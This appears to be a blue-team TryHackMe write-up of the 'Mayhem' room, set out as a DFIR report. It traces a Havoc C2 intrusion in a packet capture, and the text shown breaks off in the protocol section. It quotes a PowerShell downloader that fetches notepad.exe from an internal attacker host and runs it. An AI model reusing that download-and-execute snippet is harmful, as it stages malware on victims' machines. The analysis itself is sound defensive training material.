# Mayhem — TryHackMe Walkthrough

## Professional Network Forensics & Havoc C2 Investigation Report

**Author:** Anurag R

**Platform:** TryHackMe

**Room:** Mayhem

**Category:** Blue Team · Network Forensics · DFIR · Malware Traffic Analysis

**Difficulty:** Medium

**Documentation Version:** Portfolio Edition v1.0

---

> **Professional Digital Forensics Investigation Report**
>
> This document reconstructs a complete attacker intrusion from a captured packet trace, analyzes PowerShell malware staging, identifies a Havoc Command & Control framework, decrypts encrypted network traffic using AES-CTR, and documents forensic artifacts using a structured incident-response methodology.

---

## Table of Contents

1. Executive Summary
2. Investigation Overview
3. Room Scenario
4. Objectives
5. Environment Overview
6. Attack Surface Summary
7. Investigation Methodology
8. Evidence Collection Strategy
9. Incident Timeline
10. Network Architecture
11. Initial Threat Assessment
12. Tools Used
13. Skills Demonstrated
14. MITRE ATT&CK Coverage
15. Investigation Roadmap

---

# 1. Executive Summary

## Incident Overview

The **Mayhem** room presents a realistic **Digital Forensics and Incident Response (DFIR)** investigation in which the analyst receives a packet capture containing evidence of malicious network activity between an internal Windows workstation and a suspicious HTTP server.

Unlike offensive CTF rooms that focus on exploitation, Mayhem emphasizes **evidence reconstruction**, **network visibility**, and **malware traffic analysis**. Every stage of the intrusion—from payload delivery to encrypted command-and-control communications—must be reconstructed using forensic techniques.

The investigation reveals a staged PowerShell downloader that retrieves a disguised executable (`notepad.exe`), executes it on the victim machine, and establishes communication with a **Havoc C2 Teamserver**. By identifying the Havoc initialization packet, extracting cryptographic material, and decrypting encrypted payloads, the analyst can recover attacker commands, persistence mechanisms, network configuration information, and sensitive file access.

---

## Incident Classification

| Category            | Value                                                 |
| ------------------- | ----------------------------------------------------- |
| Investigation Type  | Network Forensics Investigation                       |
| Incident Type       | Malware Infection & Command-and-Control Communication |
| Threat Category     | Post-Exploitation Framework Activity                  |
| Malware Family      | Havoc Demon Agent                                     |
| Attack Vector       | PowerShell Downloader                                 |
| Evidence Source     | Wireshark Packet Capture                              |
| Encryption Observed | AES-CTR                                               |
| Analyst Focus       | Packet Reconstruction & Threat Hunting                |

---

## Investigation Goals

The primary goals of this investigation are to:

* Identify the compromised workstation.
* Determine how the malware was delivered.
* Recover the malicious payload.
* Attribute the payload to a known C2 framework.
* Reverse engineer encrypted network traffic.
* Recover forensic artifacts without executing malware.
* Produce a complete DFIR investigation report.

---

## Analyst Perspective

This report approaches the room as though investigating a **real enterprise security incident**. Every conclusion is supported through observable network evidence instead of assumptions or challenge answers.

The documentation intentionally prioritizes:

* Evidence integrity.
* Investigation methodology.
* Timeline reconstruction.
* Defensive understanding.
* Threat hunting opportunities.

> **Public Portfolio Policy:** All challenge flags, passwords, credentials, and direct answer strings have been intentionally **redacted**.

---

# 2. Investigation Overview

## Case Description

A packet capture (`traffic.pcapng`) is provided as the sole evidence artifact. The objective is to determine what occurred during a suspected compromise of a Windows workstation.

Initial packet inspection reveals HTTP communication between two internal systems:

| Host          | Role                                       |
| ------------- | ------------------------------------------ |
| **10.0.2.38** | Suspected Victim Workstation               |
| **10.0.2.37** | Suspicious HTTP Server / C2 Infrastructure |

Further analysis demonstrates that the server delivers a PowerShell installer, stages an executable masquerading as **Notepad**, and later communicates using an encrypted protocol associated with **Havoc Command & Control**.

---

## Investigation Flow

```text
Evidence Collection
        │
        ▼
PCAP Triage
        │
        ▼
HTTP Stream Reconstruction
        │
        ▼
PowerShell Downloader Analysis
        │
        ▼
Malware Extraction
        │
        ▼
Static Malware Triage
        │
        ▼
Havoc C2 Identification
        │
        ▼
Protocol Reverse Engineering
        │
        ▼
AES-CTR Session Recovery
        │
        ▼
Encrypted Traffic Decryption
        │
        ▼
Windows Artifact Recovery
        │
        ▼
Incident Timeline Reconstruction
```

---

## What Makes This Room Valuable?

This room teaches practical SOC investigation skills rarely covered in beginner labs.

### Key Learning Areas

| Blue Team Skill                 | Investigation Coverage |
| ------------------------------- | ---------------------- |
| Wireshark Investigation         | ✅                      |
| HTTP Stream Analysis            | ✅                      |
| HTTP Object Extraction          | ✅                      |
| Malware Traffic Analysis        | ✅                      |
| Threat Intelligence Correlation | ✅                      |
| Protocol Analysis               | ✅                      |
| AES Cryptographic Investigation | ✅                      |
| Windows Artifact Discovery      | ✅                      |
| Threat Hunting                  | ✅                      |
| DFIR Documentation              | ✅                      |

Rather than exploiting vulnerabilities, analysts learn to **extract intelligence from encrypted network traffic**.

---

# 3. Room Scenario

## Threat Narrative

A Windows workstation appears to have contacted a suspicious internal HTTP server hosting a PowerShell script.

The script downloads an executable named `notepad.exe`, saves it inside the user's Downloads directory, and immediately launches it.

After execution, the workstation begins communicating with the remote server through encrypted HTTP requests.

The analyst's responsibility is to determine:

* What executable was delivered?
* Which malware family is involved?
* What encryption protects the traffic?
* What commands were executed remotely?
* What persistence was established?
* What sensitive information was accessed?

---

## Investigation Storyline

The intrusion unfolds in several distinct stages.

<table columnSizing="auto">
  <table-row>
    <table-cell width="180">**Stage**</table-cell>
    <table-cell>**Observed Behaviour**</table-cell>
  </table-row>
  <table-row>
    <table-cell>Stage 01</table-cell>
    <table-cell>Victim requests PowerShell installer.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Stage 02</table-cell>
    <table-cell>Installer downloads disguised executable.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Stage 03</table-cell>
    <table-cell>Executable establishes encrypted HTTP communications.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Stage 04</table-cell>
    <table-cell>Havoc C2 registration packet exchanged.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Stage 05</table-cell>
    <table-cell>Encrypted attacker tasking begins.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Stage 06</table-cell>
    <table-cell>Persistence and reconnaissance commands executed.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Stage 07</table-cell>
    <table-cell>Sensitive file accessed and challenge artifacts recovered.</table-cell>
  </table-row>
</table>

---

## Threat Hunting Objective

The investigation answers one central question:

> **Can we reconstruct the attacker’s actions without ever executing the malware?**

The answer is **yes**, through packet analysis, malware triage, protocol understanding, and cryptographic reconstruction.

---

# 4. Objectives

## Primary Objectives

* Identify attacker infrastructure.
* Recover malicious payloads.
* Attribute malware to Havoc C2.
* Recover AES cryptographic parameters.
* Decrypt encrypted C2 communications.
* Recover host artifacts.
* Document the incident professionally.

---

## Secondary Objectives

* Learn Wireshark object extraction.
* Understand Havoc network protocol.
* Practice CyberChef AES workflows.
* Correlate encrypted traffic with attacker commands.
* Build a reusable forensic methodology.

---

## Deliverables

This repository contains several deliverables designed for recruiters and cybersecurity portfolios.

| Deliverable          | Purpose                             |
| -------------------- | ----------------------------------- |
| `README.md`          | Repository landing page.            |
| `Documentation.md`   | Complete investigation report.      |
| `Documentation.docx` | Printable report.                   |
| `Resources/notes.md` | Analyst reference notes.            |
| `docs/index.md`      | Premium GitHub Pages documentation. |

---

# 5. Environment Overview

## Evidence Provided

The investigation begins with a compressed archive containing a network packet capture.

### Primary Artifact

| Evidence         | Description                        |
| ---------------- | ---------------------------------- |
| `traffic.pcapng` | Complete captured network session. |

The packet capture contains HTTP communications, TCP sessions, encrypted POST requests, and attacker responses.

---

## Operating System Observations

Evidence indicates the compromised endpoint is a Windows workstation.

### Observed Indicators

* PowerShell execution.
* Windows User SID.
* Windows networking commands.
* User Downloads directory.
* Windows executable (`.exe`).

---

## Hosts Identified

<table columnSizing="auto">
  <table-row>
    <table-cell width="220">**Host**</table-cell>
    <table-cell>**Role**</table-cell>
  </table-row>
  <table-row>
    <table-cell>`10.0.2.38`</table-cell>
    <table-cell>Victim workstation executing attacker payload.</table-cell>
  </table-row>
  <table-row>
    <table-cell>`10.0.2.37`</table-cell>
    <table-cell>HTTP staging server and Havoc Teamserver.</table-cell>
  </table-row>
</table>

---

## Network Services Observed

| Port     | Protocol | Purpose                                    |
| -------- | -------- | ------------------------------------------ |
| TCP 1337 | HTTP     | Payload delivery server.                   |
| TCP 80   | HTTP     | Havoc C2 communication.                    |
| TCP 443  | HTTPS    | Existing legitimate connections (ignored). |

---

# 6. Attack Surface Summary

## Initial Access Vector

The compromise begins through an HTTP-delivered PowerShell script.

### PowerShell Responsibilities

* Retrieve malicious executable.
* Store executable locally.
* Launch executable immediately.

---

## Payload Characteristics

| Characteristic   | Observation           |
| ---------------- | --------------------- |
| Filename         | `notepad.exe`         |
| Location         | User Downloads folder |
| Delivery Method  | HTTP                  |
| Execution Method | PowerShell            |

The filename masquerades as a legitimate Windows utility.

---

## Malware Behaviour Summary

* Staging through PowerShell.
* Executable masquerading.
* HTTP beaconing.
* Encrypted C2 traffic.
* Windows reconnaissance.
* Persistence creation.
* Sensitive file discovery.

---

# 7. Investigation Methodology

## DFIR Workflow

This investigation follows a structured Digital Forensics workflow.

### Phase 1 — Identification

* Identify suspicious hosts.
* Identify suspicious protocols.
* Locate malicious HTTP streams.

### Phase 2 — Collection

* Export PowerShell script.
* Export executable.
* Preserve packet evidence.

### Phase 3 — Examination

* Static malware analysis.
* Threat intelligence lookup.
* Protocol inspection.

### Phase 4 — Analysis

* Identify Havoc initialization.
* Recover cryptographic material.
* Decrypt encrypted communications.

### Phase 5 — Reporting

* Timeline reconstruction.
* IOC extraction.
* MITRE ATT&CK mapping.
* Defensive recommendations.

---

## Evidence Preservation Principles

Throughout this investigation:

* Malware is **never executed**.
* Evidence remains packet-derived.
* Cryptographic material is recovered from traffic.
* Conclusions are tied to observable packets.

This mirrors real-world DFIR practices.

---

# 8. Evidence Collection Strategy

## Primary Sources

<table columnSizing="auto">
  <table-row>
    <table-cell width="220">**Evidence Source**</table-cell>
    <table-cell>**Purpose**</table-cell>
  </table-row>
  <table-row>
    <table-cell>Wireshark Packet Capture</table-cell>
    <table-cell>Network reconstruction.</table-cell>
  </table-row>
  <table-row>
    <table-cell>HTTP Streams</table-cell>
    <table-cell>PowerShell recovery.</table-cell>
  </table-row>
  <table-row>
    <table-cell>HTTP Objects</table-cell>
    <table-cell>Malware extraction.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Strings Analysis</table-cell>
    <table-cell>Static malware indicators.</table-cell>
  </table-row>
  <table-row>
    <table-cell>VirusTotal</table-cell>
    <table-cell>Threat intelligence validation.</table-cell>
  </table-row>
  <table-row>
    <table-cell>CyberChef</table-cell>
    <table-cell>AES traffic decryption.</table-cell>
  </table-row>
</table>

---

## Supporting Research

Supporting research helps explain protocol behaviour rather than replacing packet evidence.

Research areas include:

* Havoc C2 protocol structure.
* AES CTR implementation.
* Wireshark export techniques.
* Malware traffic analysis.

---

# 9. Incident Timeline (High-Level)

<table columnSizing="auto">
  <table-row>
    <table-cell width="180">**Phase**</table-cell>
    <table-cell>**Investigation Summary**</table-cell>
  </table-row>
  <table-row>
    <table-cell>Reconnaissance</table-cell>
    <table-cell>Normal TCP teardown observed.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Initial Access</table-cell>
    <table-cell>PowerShell installer downloaded.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Execution</table-cell>
    <table-cell>Malicious executable launched.</table-cell>
  </table-row>
  <table-row>
    <table-cell>C2 Registration</table-cell>
    <table-cell>Havoc DEMON_INIT packet exchanged.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Command Execution</table-cell>
    <table-cell>Encrypted attacker commands delivered.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Persistence</table-cell>
    <table-cell>Additional Windows account created.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Discovery</table-cell>
    <table-cell>Network configuration and sensitive files accessed.</table-cell>
  </table-row>
</table>

---

## Investigation Roadmap

The remainder of this report follows the same sequence used during the actual forensic investigation.

<table columnSizing="auto">
  <table-row>
    <table-cell width="220">**Upcoming Section**</table-cell>
    <table-cell>**Focus**</table-cell>
  </table-row>
  <table-row>
    <table-cell>Section 10</table-cell>
    <table-cell>Wireshark Packet Capture Analysis.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Section 11</table-cell>
    <table-cell>PowerShell Downloader Investigation.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Section 12</table-cell>
    <table-cell>HTTP Object Extraction.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Section 13</table-cell>
    <table-cell>Malware Static Analysis.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Section 14</table-cell>
    <table-cell>Havoc C2 Protocol Reverse Engineering.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Section 15</table-cell>
    <table-cell>AES CTR Cryptographic Analysis.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Section 16</table-cell>
    <table-cell>CyberChef Decryption Workflow.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Section 17</table-cell>
    <table-cell>Host Artifact Recovery.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Section 18</table-cell>
    <table-cell>MITRE ATT&CK Mapping & Detection Engineering.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Section 19</table-cell>
    <table-cell>Indicators of Compromise, Defensive Recommendations & Lessons Learned.</table-cell>
  </table-row>
</table>

---

# 10. Network Forensics Investigation — Wireshark Packet Capture Analysis

> *“Every packet tells part of the story. The analyst's job is connecting them into an incident timeline.”*

This section begins the forensic investigation using the supplied packet capture. Rather than immediately searching for challenge answers, the investigation first establishes **what happened on the network**, **who communicated**, and **when malicious activity began**.

The packet capture serves as the **single source of truth** throughout this report.

---

## Investigation Objective

The first objective is to determine:

* Which systems are communicating?
* Which protocols are involved?
* Which packets indicate malicious activity?
* Where does the attack begin?

Before extracting malware or decrypting traffic, the analyst must build confidence in the network timeline.

---

## Initial Packet Capture Overview

The packet capture opens inside **Wireshark**, revealing hundreds of packets across multiple TCP sessions.

![Figure 02 — Initial Wireshark Packet Capture Overview](../docs/assets/02_pcap_overview.png)

**Figure 02 — Initial Packet Capture Overview**

### Initial Observations

Several important characteristics are immediately visible:

<table columnSizing="auto">
  <table-row>
    <table-cell width="220">**Observation**</table-cell>
    <table-cell>**Analyst Interpretation**</table-cell>
  </table-row>
  <table-row>
    <table-cell>Multiple TCP FIN packets</table-cell>
    <table-cell>Existing HTTP/HTTPS sessions terminating normally.</table-cell>
  </table-row>
  <table-row>
    <table-cell>New TCP handshake</table-cell>
    <table-cell>Fresh communication begins between two internal hosts.</table-cell>
  </table-row>
  <table-row>
    <table-cell>HTTP requests appear shortly afterward</table-cell>
    <table-cell>Possible payload delivery mechanism.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Internal IP addresses only</table-cell>
    <table-cell>Investigation focuses on east-west network traffic.</table-cell>
  </table-row>
</table>

---

## Why Ignore the First Packets?

One of the easiest mistakes during packet analysis is investigating **every packet equally**.

The capture begins with several TCP packets containing the **FIN** flag.

These indicate graceful termination of previous TCP sessions rather than attacker activity.

### Analyst Decision

Those packets are excluded from the primary investigation because they do not contribute to the intrusion chain.

This reduces investigation noise.

---

## Identifying the First Suspicious TCP Session

After the FIN traffic, Wireshark shows a new TCP three-way handshake.

### Three-Way Handshake

```text id="yt1l9w"
10.0.2.38                     10.0.2.37

SYN      ─────────────────────────►

         ◄─────────────────────── SYN ACK

ACK      ─────────────────────────►
```

This establishes a new HTTP session.

### Hosts Identified

<table columnSizing="auto">
  <table-row>
    <table-cell width="220">**Host**</table-cell>
    <table-cell>**Role During Investigation**</table-cell>
  </table-row>
  <table-row>
    <table-cell>`10.0.2.38`</table-cell>
    <table-cell>Windows workstation requesting files.</table-cell>
  </table-row>
  <table-row>
    <table-cell>`10.0.2.37`</table-cell>
    <table-cell>HTTP server delivering payloads.</table-cell>
  </table-row>
</table>

At this stage, the roles are hypotheses based on network behavior.

The evidence supporting these roles comes later.

---

## Filtering Traffic Between Both Hosts

To reduce unrelated traffic, filter only communication between the two systems.

```wireshark
ip.addr == 10.0.2.38 && ip.addr == 10.0.2.37
```

### Why This Filter?

It removes unrelated broadcasts, DNS traffic, and terminated sessions while preserving the attacker timeline.

**Blue Team Tip**

Always isolate suspicious conversations before performing application-layer analysis.

---

## HTTP Communication Begins

Immediately after the TCP handshake, Wireshark shows HTTP requests originating from the workstation.

The first interesting request retrieves a PowerShell script.

### HTTP GET Request

```
GET /install.ps1 HTTP/1.1
```

This is the **first observable attacker-controlled artifact**.

---

## Following the HTTP Stream

Wireshark allows complete reconstruction of HTTP conversations.

Navigation:

```text id="ikb9ad"
Right Click Packet
        │
        ▼
Follow
        ▼
HTTP Stream
```

This reconstructs the PowerShell file exactly as transferred.

![Figure 03 — HTTP Stream Reconstruction](../docs/assets/03_http_install_ps1.png)

**Figure 03 — PowerShell Script Retrieved via HTTP**

---

## Analyst Observations

Several characteristics immediately indicate suspicious behavior.

<table columnSizing="auto">
  <table-row>
    <table-cell width="220">**Behavior**</table-cell>
    <table-cell>**Why It Is Suspicious**</table-cell>
  </table-row>
  <table-row>
    <table-cell>PowerShell downloads executable</table-cell>
    <table-cell>Common malware staging technique.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Downloads into Downloads folder</table-cell>
    <table-cell>User-writable execution location.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Immediate process execution</table-cell>
    <table-cell>No user interaction required.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Uses HTTP instead of HTTPS</table-cell>
    <table-cell>Payload visible inside packet capture.</table-cell>
  </table-row>
</table>

---

## Why This Packet Matters

This HTTP request establishes:

* payload delivery,
* victim host,
* attacker infrastructure,
* delivery mechanism.

It becomes the **starting point** of the forensic timeline.

---

# 11. PowerShell Downloader Investigation

The recovered PowerShell script functions as a lightweight malware downloader.

Instead of containing malicious functionality itself, it retrieves the actual executable.

---

## Recovering install.ps1

The reconstructed script contains multiple download methods.

### Simplified Behaviour

```powershell
$URL = "http://10.0.2.37:1337/notepad.exe"

$Destination = "C:\Users\paco\Downloads\notepad.exe"

Invoke-WebRequest -Uri $URL -OutFile $Destination

$WebClient.DownloadFile($URL,$Destination)

Start-Process $Destination
```

---

## What Does This Script Do?

Step-by-step analysis:

<table columnSizing="auto">
  <table-row>
    <table-cell width="220">**PowerShell Function**</table-cell>
    <table-cell>**Purpose**</table-cell>
  </table-row>
  <table-row>
    <table-cell>`Invoke-WebRequest`</table-cell>
    <table-cell>Downloads payload over HTTP.</table-cell>
  </table-row>
  <table-row>
    <table-cell>`System.Net.WebClient`</table-cell>
    <table-cell>Second download method.</table-cell>
  </table-row>
  <table-row>
    <table-cell>`DownloadFile()`</table-cell>
    <table-cell>Writes executable locally.</table-cell>
  </table-row>
  <table-row>
    <table-cell>`Start-Process`</table-cell>
    <table-cell>Executes downloaded malware.</table-cell>
  </table-row>
</table>

---

## Why Two Download Methods?

The script downloads the executable **twice**.

Possible reasons include:

* redundancy,
* compatibility,
* fallback behavior.

### Analyst Note

Using both download methods increases reliability during execution.

This pattern appears in commodity malware loaders and red-team tooling.

---

## Living-Off-the-Land Technique

PowerShell is a trusted Windows administration utility.

The attacker abuses legitimate Windows components instead of dropping a downloader binary.

### MITRE Mapping

| Technique     | Description            |
| ------------- | ---------------------- |
| **T1059.001** | PowerShell execution.  |
| **T1105**     | Ingress Tool Transfer. |

---

## IOC Extraction from PowerShell

The script immediately reveals several indicators.

<table columnSizing="auto">
  <table-row>
    <table-cell width="220">**IOC Type**</table-cell>
    <table-cell>**Recovered Indicator**</table-cell>
  </table-row>
  <table-row>
    <table-cell>Remote Server</table-cell>
    <table-cell>`10.0.2.37`</table-cell>
  </table-row>
  <table-row>
    <table-cell>Destination Folder</table-cell>
    <table-cell>User Downloads directory.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Downloaded File</table-cell>
    <table-cell>`notepad.exe`</table-cell>
  </table-row>
  <table-row>
    <table-cell>Execution Method</table-cell>
    <table-cell>`Start-Process`</table-cell>
  </table-row>
</table>

---

## Why Downloads Folder?

Malware frequently uses:

* Downloads
* Temp
* AppData
* Public

These directories typically allow execution without administrator privileges.

---

## Threat Hunting Opportunity

A defender could detect:

### Sigma Rule Idea

* PowerShell downloads executable.
* Downloads into Downloads folder.
* Executes immediately afterward.

### Sysmon Events

<table columnSizing="auto">
  <table-row>
    <table-cell width="160">**Event ID**</table-cell>
    <table-cell>**Reason**</table-cell>
  </table-row>
  <table-row>
    <table-cell>1</table-cell>
    <table-cell>PowerShell process creation.</table-cell>
  </table-row>
  <table-row>
    <table-cell>3</table-cell>
    <table-cell>Network connection.</table-cell>
  </table-row>
  <table-row>
    <table-cell>11</table-cell>
    <table-cell>File creation (`notepad.exe`).</table-cell>
  </table-row>
</table>

---

# 12. HTTP Object Extraction

Recovering the transferred executable is the next major investigative milestone.

The malware exists **inside the PCAP**.

---

## Exporting HTTP Objects

Wireshark reconstructs transferred files.

Navigation:

```text id="tr0k0g"
File
   │
   ▼
Export Objects
   │
   ▼
HTTP
```

![Figure 04 — HTTP Object Export Window](../docs/assets/04_http_object_export.png)

**Figure 04 — Recovering Malware From HTTP Objects**

---

## Exported Files

<table columnSizing="auto">
  <table-row>
    <table-cell width="220">**Recovered File**</table-cell>
    <table-cell>**Purpose**</table-cell>
  </table-row>
  <table-row>
    <table-cell>`install.ps1`</table-cell>
    <table-cell>PowerShell loader.</table-cell>
  </table-row>
  <table-row>
    <table-cell>`notepad.exe`</table-cell>
    <table-cell>Delivered malware payload.</table-cell>
  </table-row>
</table>

---

## Why Export Instead of Execute?

Running malware during forensic analysis contaminates evidence.

### Recommended Workflow

1. Export binary.
2. Hash binary.
3. Static analysis.
4. Reputation lookup.
5. Dynamic analysis only inside sandbox.

This investigation stops after static analysis because packet evidence is sufficient.

---

## Evidence Integrity

<table columnSizing="auto">
  <table-row>
    <table-cell width="240">**Evidence Principle**</table-cell>
    <table-cell>**Implementation**</table-cell>
  </table-row>
  <table-row>
    <table-cell>Preserve Original PCAP</table-cell>
    <table-cell>Never modify source evidence.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Export Separate Copy</table-cell>
    <table-cell>Analyze duplicate artifact.</table-cell>
  </table-row>
  <table-row>
    <table-cell>No Execution</table-cell>
    <table-cell>Prevent accidental compromise.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Static Triage First</table-cell>
    <table-cell>Reduce operational risk.</table-cell>
  </table-row>
</table>

---

## Chain of Custody (Portfolio Version)

<table columnSizing="auto">
  <table-row>
    <table-cell width="220">**Evidence Stage**</table-cell>
    <table-cell>**Analyst Action**</table-cell>
  </table-row>
  <table-row>
    <table-cell>Collection</table-cell>
    <table-cell>PCAP acquired.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Preservation</table-cell>
    <table-cell>Original capture retained.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Extraction</table-cell>
    <table-cell>HTTP objects exported.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Examination</table-cell>
    <table-cell>Static malware analysis performed.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Reporting</table-cell>
    <table-cell>Findings documented.</table-cell>
  </table-row>
</table>

---

# 13. Static Malware Analysis — `notepad.exe`

The executable masquerades as a legitimate Windows application.

Its filename is intentionally deceptive.

---

## Initial Triage with strings

Rather than opening the executable, begin with **strings analysis**.

Command:

```bash
strings notepad.exe
```

![Figure 05 — Strings Analysis](../docs/assets/05_strings_analysis.png)

**Figure 05 — Static String Investigation**

---

## Interesting Strings

Several strings stand out during analysis.

<table columnSizing="auto">
  <table-row>
    <table-cell width="220">**Recovered String**</table-cell>
    <table-cell>**Investigation Value**</table-cell>
  </table-row>
  <table-row>
    <table-cell>`demon.x64.exe`</table-cell>
    <table-cell>Strong Havoc indicator.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Windows networking APIs</table-cell>
    <table-cell>Network communication capabilities.</table-cell>
  </table-row>
  <table-row>
    <table-cell>PE metadata</table-cell>
    <table-cell>Executable structure validation.</table-cell>
  </table-row>
</table>

---

## Why demon.x64.exe Matters

This string is the investigation pivot.

Instead of generic malware, it suggests:

* Havoc Demon Agent
* Havoc C2 framework
* Post-exploitation tooling

The investigation shifts from malware identification to **protocol analysis**.

---

## Masquerading Behavior

The executable pretends to be **Notepad**.

### ATT&CK Technique

| Technique | Description                       |
| --------- | --------------------------------- |
| **T1036** | Masquerading legitimate software. |

Indicators include:

* legitimate filename,
* suspicious location,
* malicious behavior,
* network beaconing.

---

## Threat Intelligence Correlation

The recovered executable can be investigated through **VirusTotal**.

![Figure 06 — VirusTotal Malware Classification](../docs/assets/06_virustotal_analysis.png)

**Figure 06 — Threat Intelligence Correlation**

---

## Analyst Conclusions from VirusTotal

The malware is associated with:

* Havoc
* Demon Agent
* Trojan
* Backdoor
* Post-exploitation tooling

This supports the hypothesis formed from strings analysis.

---

## Why Threat Intelligence Is Only Supporting Evidence

Threat intelligence is **validation**, not primary evidence.

The investigation still relies on:

* packet capture,
* executable strings,
* protocol behavior,
* decrypted communications.

This distinction is important during real incident response.

---

## IOC Table

<table columnSizing="auto">
  <table-row>
    <table-cell width="220">**Indicator Type**</table-cell>
    <table-cell>**Recovered Indicator**</table-cell>
  </table-row>
  <table-row>
    <table-cell>Filename</table-cell>
    <table-cell>`notepad.exe`</table-cell>
  </table-row>
  <table-row>
    <table-cell>Masquerading Artifact</table-cell>
    <table-cell>`demon.x64.exe` reference.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Malware Framework</table-cell>
    <table-cell>Havoc C2.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Transport Protocol</table-cell>
    <table-cell>HTTP.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Delivery Mechanism</table-cell>
    <table-cell>PowerShell Downloader.</table-cell>
  </table-row>
</table>

---

## Malware Execution Timeline

```text id="ts0j4y"
install.ps1
      │
      ▼
HTTP GET /notepad.exe
      │
      ▼
Downloads Folder
      │
      ▼
Start-Process
      │
      ▼
notepad.exe
      │
      ▼
Havoc Demon Initialization
      │
      ▼
Encrypted HTTP Beacon
```

This timeline is reconstructed **entirely from network evidence**.

---

# Phase Summary (Sections 10–13)

The investigation has now established the complete **initial compromise chain**.

<table columnSizing="auto">
  <table-row>
    <table-cell width="220">**Evidence Established**</table-cell>
    <table-cell>**Status**</table-cell>
  </table-row>
  <table-row>
    <table-cell>Victim Workstation Identified</table-cell>
    <table-cell>✅</table-cell>
  </table-row>
  <table-row>
    <table-cell>Suspicious HTTP Server Identified</table-cell>
    <table-cell>✅</table-cell>
  </table-row>
  <table-row>
    <table-cell>PowerShell Downloader Recovered</table-cell>
    <table-cell>✅</table-cell>
  </table-row>
  <table-row>
    <table-cell>Malware Extracted From PCAP</table-cell>
    <table-cell>✅</table-cell>
  </table-row>
  <table-row>
    <table-cell>Masquerading Executable Identified</table-cell>
    <table-cell>✅</table-cell>
  </table-row>
  <table-row>
    <table-cell>Havoc C2 Attribution Confirmed</table-cell>
    <table-cell>✅</table-cell>
  </table-row>
</table>

---

# 14. Havoc Command & Control Protocol Reverse Engineering

> *Understanding the protocol is the turning point of this investigation.*

At this stage of the investigation, we have already established that the executable downloaded through PowerShell is associated with the **Havoc Command & Control Framework**. The next objective is to understand **how Havoc communicates**, identify its initialization traffic, recover the encryption material used during registration, and reconstruct encrypted attacker commands.

This section documents the protocol from a **network forensics perspective**, explaining only the fields required for investigation.

---

## What is Havoc C2?

**Havoc** is an open-source post-exploitation Command & Control framework used during authorized penetration testing and adversary emulation. Similar to frameworks like Cobalt Strike or Mythic, Havoc provides operators with an interface to task compromised endpoints remotely.

A Havoc deployment contains two major components.

### Havoc Architecture

```text
                 Red Team Operator
                        │
                        ▼
             Havoc Teamserver (C2 Server)
                        │
         HTTP / HTTPS Listener (Beacon Traffic)
                        │
                        ▼
                Havoc Demon Agent
                        │
                Windows Victim Host
```

### Components Observed During Investigation

| Component           | Role                                            |
| ------------------- | ----------------------------------------------- |
| **Teamserver**      | Receives beacon traffic and issues tasks.       |
| **Listener**        | HTTP communication endpoint.                    |
| **Demon Agent**     | Malware running on the compromised workstation. |
| **Victim Endpoint** | Windows workstation (`10.0.2.38`).              |

---

## Why Protocol Analysis Matters

The packet capture contains encrypted HTTP POST requests.

Without understanding Havoc:

* payloads appear as random bytes,
* commands cannot be reconstructed,
* attacker actions remain hidden.

Understanding Havoc allows us to transform encrypted traffic into readable forensic evidence.

---

# 14.1 Identifying Havoc Beacon Traffic

After `notepad.exe` executes, outbound HTTP traffic begins almost immediately.

![Figure 07 — Havoc Initialization Packet](../docs/assets/07_havoc_init_packet.png)

**Figure 07 — First Havoc Beacon Observed in Wireshark**

### Indicators That This Is C2 Traffic

<table columnSizing="auto">
  <table-row>
    <table-cell width="220">**Observation**</table-cell>
    <table-cell>**Analyst Interpretation**</table-cell>
  </table-row>
  <table-row>
    <table-cell>Repeated HTTP POST requests</table-cell>
    <table-cell>Beacon communication.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Responses contain binary payloads</table-cell>
    <table-cell>Encrypted tasking from Teamserver.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Constant destination server</table-cell>
    <table-cell>Persistent command-and-control endpoint.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Fixed payload structure</table-cell>
    <table-cell>Custom application protocol.</table-cell>
  </table-row>
</table>

---

## Beacon Lifecycle

```text
Demon Agent
     │
     ▼
Registration Packet
     │
     ▼
Server Response
     │
     ▼
Beacon Check-in
     │
     ▼
Task Request
     │
     ▼
Encrypted Response
     │
     ▼
Repeat
```

The first registration packet is the most important because it exposes the session encryption parameters.

---

# 14.2 The DEMON_INIT Registration Packet

The first POST request exchanged between the victim and Teamserver contains a special Havoc command called **DEMON_INIT**.

This packet registers the Demon Agent with the Teamserver.

### Why This Packet Is Critical

It contains:

* Agent Identifier
* Magic Bytes
* Session AES Key
* AES Initialization Vector
* Encrypted metadata

Every later encrypted command depends on information recovered here.

---

## Packet Layout

The Havoc parser describes a **20-byte request header**.

```text
